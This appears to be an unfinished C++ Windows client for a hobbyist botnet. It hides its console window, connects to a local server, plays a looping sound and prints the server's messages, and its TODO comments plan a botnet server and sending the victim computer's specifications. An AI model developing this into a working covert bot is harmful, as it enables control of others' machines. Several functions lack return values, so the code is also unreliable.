#include <iostream>
#include <ws2tcpip.h>
#include <string>
#include <winsock2.h>

#include <cmath>
#include <mmsystem.h>
#include <thread>
#include <windows.h>
#include <shellapi.h>

#pragma comment(lib, "winmm.lib")
#pragma comment (lib, "ws2_32.lib")

// TODO: Umm, idk

using namespace std;

const char* host = "127.0.0.1";
int port = 5050;


int vbytes = 0;
int bytes = 0;
int lenght = 0;
static bool onExit = false;
bool mOn = true;

// TODO: Add math to function...
// TODO: Add more payload function like function boxes...
// TODO: Add more perfect UI
// TODO: Make a botnet server replacing python srvbot.py.. in c++. OK
// TODO: Add a function to send a specification of the computer to the botnet server.. 
// FIXME:  Music is ugly and need to be fixed..
// FIXME: Ugly thread..
// FIXME: vBytes not ready to print on the screen

int doSendIn() {
    return 0;
}

int doPythaSolve(int a = 0, int b = 0, int c = 0, string find = "i") {
    if (a != 0 && b != 0 && c != 0) {
        if (find == "c") {
            c = 0;
            a = a * a;
            b = b * b;
            c = sqrt(a+b);
            return c;
        } else if (find == "a") {
            a = 0;
            c = c * c;
            b = b * b;
            a = sqrt(c-b);
            return a;

        } else if (find == "b") {
            b = 0;
            c = c * c;
            a = a * a;
            b = sqrt(c-a);
            return b;
        }
    } else {
        puts("* Theorama pythagoras required three of this objects!");
        return 1;
    }
}

void pmusic4(void) {
    while (mOn) {
        PlaySound(TEXT("wav/mixkit-robotic-insect-buzz-332.wav"), NULL, SND_LOOP | SND_ASYNC);
    }
}

int doMath(string op, int int1, int int2) {
    if (op == "/") {
        return int1 / int2;
    } else if (op == "*") {
        return int1 * int2;
    } else if (op == "-") {
        return int1 - int2;
    } else if (op == "+") {
        return int1 + int2;
    } else {
        puts("* Func err: operator does not valid");
        return 1;
    }
}


int TConsole(const char* title) {
    SetConsoleTitle(title);
}

void HConsole() {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void mConsole() {
    ::ShowWindow(::GetConsoleWindow(), SW_SHOWMAXIMIZED);
}

void SConsole() {
    ::ShowWindow(::GetConsoleWindow(), SW_SHOW);
}

bool KConsole() {
    return ::IsWindowVisible(::GetConsoleWindow()) != false;
}


int wopen(const char* link) {
    ShellExecute(0, 0, link, 0, 0, SW_SHOW);
}

// MX Pointer..

int vPoint(int nVbytes, int nBytes, int nLenght) {
    if (vbytes < 0) {
        vbytes += nVbytes++;
        bytes += nBytes++;
        lenght += nLenght++;
    } else {
        vbytes += ((nVbytes++ + nLenght++) - nBytes * nBytes++) * -1 - 60;
        bytes += nBytes++;
        lenght += nLenght * nBytes;
    }
}

int doReset(void) {
    vbytes -= vbytes;
    bytes -= bytes;
    lenght -= lenght;
}

int sLog(string type) {
    if (type == "vbytes") {
        return vbytes;
    } else if (type == "bytes") {
        return bytes;
    } else if (type == "lenght") {
        return lenght;
    } else {
        return 1;
    }
}

void doThread(void) {
    thread music4d(pmusic4);
    music4d.detach();
}

int main(void) {
    TConsole("EMP");
    HConsole();
    system("cls");

    // Initialize winsock
    WSADATA wsData;
    WORD ver = MAKEWORD(2, 2);

    int wsOK = WSAStartup(ver, &wsData);

    if (wsOK != 0) {
        cerr << "* Cannot initialize WinSock2, quitting!" << endl;
        WSACleanup();
        return 1;
    }

    // Create Socket
    puts("* WinSock2 initialized.");

    SOCKET listn = socket(AF_INET, SOCK_STREAM, 0);

    if (listn == INVALID_SOCKET) {
        cerr << "* Can't create a socket, quitting!" << endl;
        WSACleanup();
        return 1;

    }
    puts("* Socket created.");
    Sleep(4);

    // Bind Socket
    struct sockaddr_in con;
    con.sin_family = AF_INET;
    con.sin_addr.s_addr = inet_addr(host);
    con.sin_port = htons(port);

    int conResp = connect(listn, (struct sockaddr*)&con, sizeof(con));

    if (conResp == SOCKET_ERROR) {
        cerr << "* Cannot connect to server" << endl;
        cerr << "* The server could be hanging.. " << endl;
        closesocket(listn);
        WSACleanup();
        return 1;
    
    }
    bool ok = true;
    char buf[4096];
    string usin;
    doThread();
    string msg = "Hello, okay!";

    puts("* Okay...");
    puts("* Connected.. ");
    send(listn, msg.c_str(), msg.size() + 1, 0);
    puts("* Waiting response.. ");
    puts("* Note : Server will never sent a blank response.. (Could be an error..)");
    puts("----------------------------------");

    // Wkwkwkwk
    while (ok) {
        ZeroMemory(buf, 4096);
        int msgrecv = recv(listn, buf, 4096, 0);
        if (msgrecv > 0) {
            vPoint(msgrecv, msgrecv, msgrecv);
            // cout << "* vBytes : " << sLog("vbytes") << endl; 
            // cout << "* Bytes : " << sLog("bytes") << endl; 
            // cout << "* Length : " << sLog("lenght") << endl; 
            cout << "John: " << string(buf, 0, msgrecv) << "\n" << endl;
            doReset();
        } else {
            puts("* Empty response from server.");
            puts("* There is a problem right here..");
            puts("* It could be caused by the server hanging or shutdown.. ");

            ok = false;
            return 1;
        }
    }
    return 0;
} 